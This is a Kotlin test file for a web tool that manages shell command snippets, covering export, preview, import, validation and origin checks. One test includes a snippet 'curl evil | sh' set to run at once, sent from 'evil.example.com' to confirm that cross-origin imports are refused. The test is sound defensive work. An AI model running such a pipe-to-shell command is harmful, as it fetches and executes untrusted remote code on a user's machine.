package bayern.kickner.dirl.web

import bayern.kickner.dirl.audit.Actor
import bayern.kickner.dirl.audit.AuditAction
import bayern.kickner.dirl.config.AppConfig
import bayern.kickner.dirl.config.OidcConfig
import bayern.kickner.dirl.createDirl
import bayern.kickner.dirl.vault.Snippet
import io.ktor.client.HttpClient
import io.ktor.client.request.forms.formData
import io.ktor.client.request.forms.submitForm
import io.ktor.client.request.forms.submitFormWithBinaryData
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.statement.HttpResponse
import io.ktor.client.statement.bodyAsText
import io.ktor.http.Headers
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.http.parameters
import io.ktor.server.testing.ApplicationTestBuilder
import io.ktor.server.testing.testApplication
import java.nio.file.Files
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/** Export, preview and import of snippets through HTTP, the way the browser sends the forms. */
class SnippetImportWebTest {
    private val actor = Actor("user-1", "Ada")

    private val existing = listOf(
        Snippet("a", "Disk usage", "df -h\n", "System"),
        Snippet("b", "Logs", "docker compose logs -f", "Docker"),
        Snippet("c", "Uptime", "uptime\n", null),
    )

    /** One file with a snippet of every kind: unchanged, replacing, new. */
    private val mixedFile = """{"dirlSnippets": 1, "snippets": [
        {"name": "Disk usage", "command": "df -h", "folder": "System", "run": true},
        {"name": "logs", "command": "docker compose logs -f --tail=100", "folder": "docker"},
        {"name": "Free", "command": "free -h", "run": true}
    ]}"""

    private fun newDirl(snippets: List<Snippet> = existing): Dirl {
        val dataDir = Files.createTempDirectory("dirl-snippet-import").toFile()
        val dirl = createDirl(
            AppConfig(
                publicUrl = "https://ssh.example.com",
                dataDir = dataDir.absolutePath,
                oidc = OidcConfig(issuer = "https://id.example.com", clientId = "dirl", clientSecret = "secret"),
            ),
            dataDir,
        )
        dirl.vault.setup("correct horse battery staple extra".toCharArray(), actor)
        dirl.vault.update { it.copy(snippets = snippets) }
        return dirl
    }

    /** A client without redirects and the session cookie of [actor]. */
    private class Browser(val client: HttpClient, val cookie: String)

    private fun ApplicationTestBuilder.browser(dirl: Dirl): Browser {
        application { dirlModule(dirl) }
        return Browser(createClient { followRedirects = false }, "$SESSION_COOKIE=${dirl.sessions.create(actor).token}")
    }

    private suspend fun Browser.get(path: String) = client.get(path) { header(HttpHeaders.Cookie, cookie) }

    /** The import form of the snippets page, with an uploaded [file] or [pasted] text. */
    private suspend fun Browser.preview(file: String? = null, pasted: String = "", origin: String = "https://ssh.example.com"): HttpResponse =
        client.submitFormWithBinaryData(
            "/snippets/import",
            formData {
                // Browsers send an empty part for a file input without a file.
                append("file", file.orEmpty().toByteArray(), Headers.build {
                    append(HttpHeaders.ContentDisposition, "filename=\"${if (file == null) "" else "snippets.json"}\"")
                })
                append("json", pasted)
            },
        ) {
            header(HttpHeaders.Cookie, cookie)
            header(HttpHeaders.Origin, origin)
        }

    /** The preview form, with the rows [take] ticked. */
    private suspend fun Browser.apply(data: String, take: List<Int>, replaceAll: Boolean = false, origin: String = "https://ssh.example.com"): HttpResponse =
        client.submitForm("/snippets/import/apply", parameters {
            append("data", data)
            take.forEach { append("take", it.toString()) }
            if (replaceAll) append("replaceAll", "on")
            append("conflicts", "replace")
        }) {
            header(HttpHeaders.Cookie, cookie)
            header(HttpHeaders.Origin, origin)
        }

    /** The hidden entries of a preview page, unescaped as the browser sends them back. */
    private fun hiddenData(page: String): String {
        val raw = Regex("name=\"data\" value=\"([^\"]*)\"").find(page)?.groupValues?.get(1) ?: error("no data field in $page")
        return raw.replace("&quot;", "\"").replace("&#34;", "\"").replace("&lt;", "<").replace("&gt;", ">")
            .replace("&#39;", "'").replace("&apos;", "'").replace("&amp;", "&")
    }

    /** Previews [file] and imports the rows [take], returns the redirect. */
    private suspend fun Browser.importFile(file: String, take: List<Int>, replaceAll: Boolean = false): HttpResponse {
        val preview = preview(file = file)
        assertEquals(HttpStatusCode.OK, preview.status, preview.bodyAsText())
        return apply(hiddenData(preview.bodyAsText()), take, replaceAll)
    }

    private fun Dirl.snippets() = vault.content!!.snippets
    private fun Dirl.lastImport() = audit.tail().first { it.action == AuditAction.SNIPPETS_IMPORTED }.detail

    @Test
    fun `an export imported into another instance gives the same snippets`() {
        val tricky = existing + Snippet("d", "Quotes & <tags>", "echo \"a\" 'b' && ls <x> | grep 'ä'\n", "Ünïcode 2.x")
        val source = newDirl(tricky)
        var exported = ""
        testApplication {
            val export = browser(source).get("/snippets/export")
            assertEquals(HttpStatusCode.OK, export.status)
            assertTrue(export.headers[HttpHeaders.ContentDisposition]!!.contains("dirl-snippets-"), export.headers.toString())
            assertTrue(export.headers[HttpHeaders.ContentType]!!.startsWith("application/json"))
            exported = export.bodyAsText()
        }
        assertEquals("4 snippets", source.audit.tail().first { it.action == AuditAction.SNIPPETS_EXPORTED }.detail)

        val target = newDirl(emptyList())
        testApplication {
            val redirect = browser(target).importFile(exported, take = listOf(0, 1, 2, 3))
            assertEquals(HttpStatusCode.Found, redirect.status)
            assertEquals("/snippets?done=snippets-imported", redirect.headers[HttpHeaders.Location])
        }
        assertEquals(tricky.map { it.copy(id = "") }.toSet(), target.snippets().map { it.copy(id = "") }.toSet())
        assertEquals(4, target.snippets().map { it.id }.toSet().size, "every snippet gets its own ID")
        assertEquals("added=4 replaced=0 deleted=0", target.lastImport())
    }

    @Test
    fun `the preview shows what would change and saves nothing`(): Unit = testApplication {
        val dirl = newDirl()
        val response = browser(dirl).preview(file = mixedFile)
        assertEquals(HttpStatusCode.OK, response.status)
        val page = response.bodyAsText()
        assertTrue(page.contains("3 snippets in the file: 1 new, 1 replacing existing ones, 1 unchanged."), page)
        assertTrue(page.contains("already there, unchanged"))
        assertTrue(page.contains("replaces existing"))
        assertTrue(page.contains(">new<"))
        assertTrue(page.contains("runs immediately"))
        assertTrue(page.contains("Existing Docker / Logs, asks first:"), "the existing command is shown next to the new one")
        assertTrue(page.contains("docker compose logs -f</pre>") && page.contains("docker compose logs -f --tail=100</pre>"))
        // Only the replacing row reacts to the choice for existing snippets, the unchanged one cannot be ticked.
        assertEquals(1, Regex("data-conflict").findAll(page).count())
        assertTrue(Regex("<input[^>]*value=\"0\"[^>]*disabled").containsMatchIn(page) || Regex("<input[^>]*disabled[^>]*value=\"0\"").containsMatchIn(page), page)
        assertTrue(page.contains("Deletes the 1 of your 3 snippets that are not in the file"))
        assertFalse(Regex("<script(?![^>]*src=)").containsMatchIn(page), "no inline script, the CSP forbids it")
        assertEquals(existing, dirl.snippets())
        assertTrue(dirl.audit.tail().none { it.action == AuditAction.SNIPPETS_IMPORTED })
    }

    @Test
    fun `import and replace existing ones`(): Unit = testApplication {
        val dirl = newDirl()
        browser(dirl).importFile(mixedFile, take = listOf(1, 2))
        assertEquals(
            listOf(existing[0], Snippet("b", "logs", "docker compose logs -f --tail=100", "docker"), existing[2]),
            dirl.snippets().take(3),
        )
        assertEquals(Snippet(dirl.snippets()[3].id, "Free", "free -h\n", null), dirl.snippets()[3])
        assertEquals("added=1 replaced=1 deleted=0", dirl.lastImport())
    }

    @Test
    fun `import and keep existing ones`(): Unit = testApplication {
        val dirl = newDirl()
        // "Keep the existing one" unticks the replacing row.
        browser(dirl).importFile(mixedFile, take = listOf(2))
        assertEquals(existing, dirl.snippets().take(3))
        assertEquals(listOf("Free"), dirl.snippets().drop(3).map { it.name })
        assertEquals("added=1 replaced=0 deleted=0", dirl.lastImport())
    }

    @Test
    fun `import only the rows chosen`(): Unit = testApplication {
        val dirl = newDirl()
        browser(dirl).importFile(mixedFile, take = listOf(1))
        assertEquals(listOf(existing[0], Snippet("b", "logs", "docker compose logs -f --tail=100", "docker"), existing[2]), dirl.snippets())
        assertEquals("added=0 replaced=1 deleted=0", dirl.lastImport())
    }

    @Test
    fun `delete the existing ones and use only the imported`(): Unit = testApplication {
        val dirl = newDirl()
        browser(dirl).importFile(mixedFile, take = listOf(1, 2), replaceAll = true)
        assertEquals(listOf("Disk usage", "logs", "Free"), dirl.snippets().map { it.name }, "Uptime is not in the file")
        assertEquals(existing[0], dirl.snippets()[0], "the unchanged one stays as it is")
        assertEquals("added=1 replaced=1 deleted=1 replaceAll", dirl.lastImport())
    }

    @Test
    fun `pasted snippets work like a file and a refused import changes nothing`(): Unit = testApplication {
        val dirl = newDirl()
        val browser = browser(dirl)
        val pasted = """[{"name": "Free", "command": "free -h", "run": true}]"""
        val preview = browser.preview(pasted = pasted)
        assertEquals(HttpStatusCode.OK, preview.status)
        browser.apply(hiddenData(preview.bodyAsText()), take = listOf(0))
        assertEquals("Free", dirl.snippets().last().name)

        val broken = """[{"name": "a", "command": "ls"}, {"name": "", "command": "ls"}, {"name": "A", "command": "pwd"}]"""
        val refused = browser.preview(pasted = broken)
        assertEquals(HttpStatusCode.BadRequest, refused.status)
        val page = refused.bodyAsText()
        assertTrue(page.contains("The import was refused, nothing changed."))
        assertTrue(page.contains("Snippet 2: name and command are required."), page)
        assertTrue(page.contains("&quot;name&quot;: &quot;A&quot;") || page.contains("\"name\": \"A\""), "the pasted text comes back for correcting")
        assertEquals(4, dirl.snippets().size)

        // The apply step checks the entries again, a changed hidden field is refused as well.
        val tampered = browser.apply("""[{"name": "x", "command": "${"y".repeat(4001)}"}]""", take = listOf(0))
        assertEquals(HttpStatusCode.BadRequest, tampered.status)
        assertEquals(400, browser.preview().status.value, "neither file nor text")
        assertEquals(4, dirl.snippets().size)
    }

    @Test
    fun `an uploaded file wins over pasted text and a large upload is refused`(): Unit = testApplication {
        val dirl = newDirl()
        val browser = browser(dirl)
        val page = browser.preview(file = """[{"name": "From file", "command": "ls"}]""", pasted = """[{"name": "Pasted", "command": "ls"}]""").bodyAsText()
        assertTrue(page.contains("From file") && page.contains("Pasted").not())
        val large = browser.preview(file = " ".repeat(MAX_SNIPPET_FILE_LENGTH + 1))
        assertEquals(HttpStatusCode.BadRequest, large.status)
        assertTrue(large.bodyAsText().contains("larger than 1024 KiB"))
    }

    @Test
    fun `import and export need a session and the own origin`(): Unit = testApplication {
        val dirl = newDirl()
        val browser = browser(dirl)
        assertEquals("/login", browser.client.get("/snippets/export").headers[HttpHeaders.Location])
        assertEquals(HttpStatusCode.Forbidden, browser.preview(file = mixedFile, origin = "https://evil.example.com").status)
        val data = encodeSnippetEntries(listOf(SnippetEntry("Evil", "curl evil | sh", run = true)))
        assertEquals(HttpStatusCode.Forbidden, browser.apply(data, take = listOf(0), origin = "https://evil.example.com").status)
        assertEquals(existing, dirl.snippets())
    }

    @Test
    fun `the snippets page offers export and import`(): Unit = testApplication {
        val dirl = newDirl()
        val page = browser(dirl).get("/snippets").bodyAsText()
        assertTrue(page.contains("href=\"/snippets/export\""))
        assertTrue(page.contains("Export all 3 snippets"))
        assertTrue(page.contains("action=\"/snippets/import\""))
        assertTrue(page.contains("enctype=\"multipart/form-data\""))
    }

    @Test
    fun `the tmux snippets are added through the preview`() {
        val dirl = newDirl()
        testApplication {
            val browser = browser(dirl)
            val snippetsPage = browser.get("/snippets").bodyAsText()
            assertTrue(snippetsPage.contains("href=\"/snippets/tmux\""), "the snippets page offers them")

            val preview = browser.get("/snippets/tmux")
            assertEquals(HttpStatusCode.OK, preview.status)
            val page = preview.bodyAsText()
            assertTrue(page.contains("<h1>Add tmux snippets</h1>"), page)
            assertTrue(page.contains("2 ready-made snippets: 2 new"), page)
            assertTrue(page.contains("Start tmux") && page.contains("Stop tmux"))
            assertTrue(page.contains("tmux new -A -s dirl") && page.contains("tmux kill-session -t dirl"))
            assertTrue(page.contains("name=\"replaceAll\"").not(), "adding ready-made snippets never offers to delete the others")

            val redirect = browser.apply(hiddenData(page), take = listOf(0, 1))
            assertEquals("/snippets?done=snippets-imported", redirect.headers[HttpHeaders.Location])
        }
        val tmux = dirl.snippets().filter { it.folder == "tmux" }.associateBy { it.name }
        assertEquals("tmux new -A -s dirl\n", tmux["Start tmux"]?.command, "Start runs on the tap")
        assertEquals("tmux kill-session -t dirl", tmux["Stop tmux"]?.command, "Stop ends a running job, so it asks first")
        assertEquals(existing.size + 2, dirl.snippets().size, "the other snippets stay")
        assertEquals("added=2 replaced=0 deleted=0", dirl.lastImport())
    }

    @Test
    fun `adding the tmux snippets again changes nothing`() {
        val dirl = newDirl(existing + tmuxSnippets.mapIndexed { i, entry -> entry.toSnippet("t$i") })
        testApplication {
            val page = browser(dirl).get("/snippets/tmux").bodyAsText()
            assertEquals(2, Regex("already there, unchanged").findAll(page).count(), page)
            assertTrue(Regex("<input type=\"checkbox\" name=\"take\"[^>]*checked").containsMatchIn(page).not(), "nothing is ticked")
        }
    }
}
